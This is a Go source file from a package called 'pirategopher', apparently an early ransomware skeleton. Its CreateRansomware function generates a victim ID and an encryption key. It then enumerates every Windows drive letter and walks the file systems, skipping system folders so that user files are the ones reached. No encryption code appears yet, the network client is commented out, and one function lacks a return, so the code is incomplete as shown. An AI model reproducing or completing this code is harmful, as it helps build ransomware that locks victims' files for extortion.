package pirategopher

import (
	"golang.org/x/net/bpf"
	"log"
	"os"
	"path/filepath"
	"strings"
	"time"
)

type PirateFile struct {
	Info 		os.FileInfo
	Extension 	string
	FullPath	string
}

type FileTracker struct {
	Files chan *PirateFile
}

var (
	SkippedDirs = []string{
		"ProgramData",
		"Windows",
		"bootmgr",
		"$WINDOWS.~BT",
		"Windows.old",
		"Temp",
		"tmp",
		"Program Files",
		"Program Files (x86)",
		"AppData",
		"$Recycle.Bin",
	}
)

func CreateRansomware(clientTimeout float64) {
	keys := make(map[string]string)
	// Generate the id and encryption key
	keys["id"], _ = generateRandomHexString(32)
	keys["enckey"], _ = generateRandomHexString(32)

	walkDrives(getDrives())

	//client := NewClient(time.Duration(clientTimeout) * time.Second)
}

func getDrives() (drives []string) {
	for _, letter := range "ABCDEFGHIJKLMNOPQRSTUVWXYZ" {
		drive := string(letter) + ":\\"
		_, err := os.Stat(drive)
		if err == nil {
			drives = append(drives, drive)
		}
	}
	return drives
}

func walkDrive(path string, f os.FileInfo, err error) error {
	if f.IsDir() {
		for _, skipDir := range SkippedDirs {
			if strings.Contains(filepath.Base(path), skipDir) {
				return filepath.SkipDir
			}
		}
	}
}

func walkDrives(dirs []string) {
	for _, dir := range dirs {
		err := filepath.Walk(dir, walkDrive)
		if err != nil {
			log.Println(err)
		}
	}
}
